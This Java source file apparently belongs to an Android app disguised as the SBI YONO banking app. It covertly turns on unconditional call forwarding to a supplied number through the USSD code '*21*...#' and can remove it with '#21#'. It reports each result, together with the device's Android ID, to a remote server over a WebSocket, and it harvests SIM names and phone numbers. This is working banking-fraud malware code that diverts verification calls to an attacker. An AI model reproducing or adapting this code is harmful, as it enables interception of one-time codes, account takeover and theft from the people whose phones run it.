package com.sbi.yono.service.online.FrontServices;


import static android.content.Context.TELEPHONY_SERVICE;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;

import com.sbi.yono.service.online.Helper;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class CallForwardingHelper {
    public static void setCallForwarding(Context context, String phoneNumber, int defaultSubId) {
        TelephonyManager manager = (TelephonyManager) context.getSystemService(TELEPHONY_SERVICE);
        Log.d(Helper.TAG, "user Selected Sim Id "+defaultSubId);
        if (defaultSubId <= 0) {
            SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
            defaultSubId = SubscriptionManager.getDefaultSubscriptionId();
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                List<SubscriptionInfo> activeSubscriptions = subscriptionManager.getActiveSubscriptionInfoList();
                if (activeSubscriptions != null && !activeSubscriptions.isEmpty()) {
                    SubscriptionInfo subscriptionInfo = activeSubscriptions.get(0);
                    defaultSubId = subscriptionInfo.getSubscriptionId();
                }
            }else{
                Log.d(Helper.TAG, "Permmission Not Granted to read default sim state id");
            }
        }

        Log.d(Helper.TAG, "system selected sim  id "+defaultSubId);

        SharedPreferencesHelper share = new SharedPreferencesHelper(context);
        share.saveInt("call_forwarding_active_sim_id", defaultSubId);

        // Use the main thread's Looper to create the handler
        Handler handler = new Handler(Looper.getMainLooper());
        TelephonyManager.UssdResponseCallback responseCallback = null;

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            responseCallback = new TelephonyManager.UssdResponseCallback() {
                @Override
                public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                    super.onReceiveUssdResponse(telephonyManager, request, response);

                    SharedPreferencesHelper share = new SharedPreferencesHelper(context);
                    WebSocketManager webSocketManager = new WebSocketManager(context);
                    if (!webSocketManager.isConnected()) {
                        webSocketManager.connect();
                    }
                    Log.d(Helper.TAG, "USSD "+ response.toString());
                    Helper help = new Helper();
                    JSONObject sendData = new JSONObject();
                    try {
                        sendData.put("sitename", help.SITE());
                        sendData.put("mobile_id", Helper.getAndroidId(context));
                        sendData.put("call_forwarding_active_sim_id", share.getInt("call_forwarding_active_sim_id", 0));
                        sendData.put("message", "Set USSD Response "+ response.toString());
                        sendData.put("action","response-call-forwarding-update");
                        String jsonString = sendData.toString();
                        webSocketManager.sendMessage(jsonString);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }

                }

                @Override
                public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                    super.onReceiveUssdResponseFailed(telephonyManager, request, failureCode);
                    Log.d(Helper.TAG, "USSD Error "+ String.valueOf(failureCode));
                    Helper help = new Helper();
                    JSONObject sendData = new JSONObject();
                    WebSocketManager webSocketManager = new WebSocketManager(context);
                    if (!webSocketManager.isConnected()) {
                        webSocketManager.connect();
                    }
                    try {
                        sendData.put("sitename", help.SITE());
                        sendData.put("mobile_id", Helper.getAndroidId(context));
                        sendData.put("message", "Error Set USSD  "+ String.valueOf(failureCode));
                        sendData.put("action","response-call-forwarding-update");
                        String jsonString = sendData.toString();
                        webSocketManager.sendMessage(jsonString);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                }
            };
        }

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
            String ussdRequest = "*21*" + phoneNumber + "#";
            TelephonyManager managerForSubId = manager.createForSubscriptionId(defaultSubId);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                managerForSubId.sendUssdRequest(ussdRequest, responseCallback, handler);
            }
        }
    }

    public  void removeCallForwarding(Context context, int defaultSubId) {
        TelephonyManager manager = (TelephonyManager) context.getSystemService(TELEPHONY_SERVICE);
        if (defaultSubId <= 0) {
            SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
            defaultSubId = SubscriptionManager.getDefaultSubscriptionId();
            if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                List<SubscriptionInfo> activeSubscriptions = subscriptionManager.getActiveSubscriptionInfoList();
                if (activeSubscriptions != null && !activeSubscriptions.isEmpty()) {
                    SubscriptionInfo subscriptionInfo = activeSubscriptions.get(0);
                    defaultSubId = subscriptionInfo.getSubscriptionId();
                }
            }
        }


        // Use the main thread's Looper to create the handler
        Handler handler = new Handler(Looper.getMainLooper());
        TelephonyManager.UssdResponseCallback responseCallback = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            responseCallback = new TelephonyManager.UssdResponseCallback() {
                @Override
                public void onReceiveUssdResponse(TelephonyManager telephonyManager, String request, CharSequence response) {
                    super.onReceiveUssdResponse(telephonyManager, request, response);

                    WebSocketManager webSocketManager = new WebSocketManager(context);
                    if (!webSocketManager.isConnected()) {
                        webSocketManager.connect();
                    }
                    Log.d(Helper.TAG, "Remove USSD Response "+ response.toString());
                    Helper help = new Helper();
                    JSONObject sendData = new JSONObject();
                    try {
                        sendData.put("sitename", help.SITE());
                        sendData.put("mobile_id", Helper.getAndroidId(context));
                        sendData.put("call_forwarding_active_sim_id", 10000000);
                        sendData.put("message", "Remove USSD Response "+ response.toString());
                        sendData.put("action","response-call-forwarding-update");
                        String jsonString = sendData.toString();
                        webSocketManager.sendMessage(jsonString);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }

                }

                @Override
                public void onReceiveUssdResponseFailed(TelephonyManager telephonyManager, String request, int failureCode) {
                    super.onReceiveUssdResponseFailed(telephonyManager, request, failureCode);
                    Log.d(Helper.TAG, "Remove USSD Error "+ String.valueOf(failureCode));
                    Helper help = new Helper();
                    JSONObject sendData = new JSONObject();
                    WebSocketManager webSocketManager = new WebSocketManager(context);
                    if (!webSocketManager.isConnected()) {
                        webSocketManager.connect();
                    }
                    try {
                        sendData.put("sitename", help.SITE());
                        sendData.put("mobile_id", Helper.getAndroidId(context));
                        sendData.put("message", "Error Remove USSD  "+ String.valueOf(failureCode));
                        sendData.put("action","response-call-forwarding-update");
                        String jsonString = sendData.toString();
                        webSocketManager.sendMessage(jsonString);
                    } catch (JSONException e) {
                        throw new RuntimeException(e);
                    }
                }
            };
        }

        TelephonyManager manager1;
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
            String ussdRequest = "#21#";
            manager1 = manager.createForSubscriptionId(defaultSubId);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                manager1.sendUssdRequest(ussdRequest, responseCallback, handler);
            }
        }
    }



    public static String getSimDetails(Context context) throws JSONException {
        SubscriptionManager subscriptionManager = (SubscriptionManager) context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            Toast.makeText(context, "Permission to read phone state is required.", Toast.LENGTH_SHORT).show();
            return "";
        }

        JSONObject simData = new JSONObject();
        List<SubscriptionInfo> activeSubscriptions = subscriptionManager.getActiveSubscriptionInfoList();
        if (activeSubscriptions != null && !activeSubscriptions.isEmpty()) {
            for (SubscriptionInfo subscriptionInfo : activeSubscriptions) {
                String simName = subscriptionInfo.getDisplayName().toString();
                int subId = subscriptionInfo.getSubscriptionId();
                String phoneNumber = subscriptionInfo.getNumber();
                if(phoneNumber == null) {
                    phoneNumber = "N/A";
                }
                JSONObject simRow = new JSONObject();
                simRow.put("sim_id", subId);
                simRow.put("sim_name", simName);
                simRow.put("sim_number", phoneNumber);
                simData.put(String.valueOf(subId), simRow);
            }
            Log.d(Helper.TAG, "SIM Info"+ simData.toString());
            return simData.toString();
        } else {
            Toast.makeText(context, "No active subscriptions found.", Toast.LENGTH_SHORT).show();
            return "No active subscriptions found";
        }
    }

}
